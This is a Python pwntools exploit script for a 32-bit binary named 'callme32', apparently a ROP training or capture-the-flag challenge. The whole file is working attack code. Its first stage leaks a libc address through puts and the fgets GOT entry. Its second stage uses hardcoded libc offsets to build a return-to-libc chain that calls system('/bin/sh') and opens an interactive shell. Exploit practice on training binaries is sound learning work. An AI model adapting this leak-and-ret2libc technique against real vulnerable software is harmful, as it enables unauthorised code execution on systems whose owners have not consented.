#!/usr/bin/env python

from pwn import *

def create_stage(func, ret, arg):
    chain =  "A"*44
    chain += p32(func)
    chain += p32(ret)
    chain += p32(arg)
    return chain

def info(fgets_libc, libc_base, system, bin_sh):
    log.info("fgets@libc:  0x%x" % fgets_libc)
    log.success("leaked libc: 0x%x" % libc_base)
    log.info("system@libc: 0x%x" % system)
    log.info("binsh@libc:  0x%x" % bin_sh)

def exploit():
    
    p = process('./callme32')
    binary = ELF("callme32", checksec=False)
    # libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)

    # libc offsets - they depend on libc used
    offset = {
        'system' : 0x0003ada0,  # readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
        '/bin/sh': 0x15b9ab,    # strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh ...or using pwntools: libc.search("/bin/sh").next()
        'fgets'  : 0x0005e150,  # readelf -s /lib/i386-linux-gnu/libc.so.6 | grep fgets
        'exit'   : 0x0002e9d0   # readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
        }

    puts_plt  = binary.symbols["puts"]   
    main_addr = binary.symbols["main"]
    fgets_got = binary.symbols["got.fgets"]

    # create stage1 to leak libc through fgets
    stage1 =  create_stage(puts_plt, main_addr, fgets_got)
    p.sendlineafter('> ', stage1)
    fgets_libc = u32(p.recv()[:4])
    log.success('Stage 1 sent!')

    # calculate the actual addresses of the libc functions
    libc_base = fgets_libc - offset['fgets']
    system    = libc_base + offset['system']
    exit      = libc_base + offset['exit']
    bin_sh    = libc_base + offset['/bin/sh']

    # print out info leaked...
    info(fgets_libc, libc_base, system, bin_sh)

    # create the rop chain for stage 2 to spawn a shell
    stage2 = create_stage(system, exit, bin_sh)
    log.info('Sending stage 2...')
    p.sendline(stage2)
    p.interactive()

if __name__ == '__main__':
    exploit()
#_EOF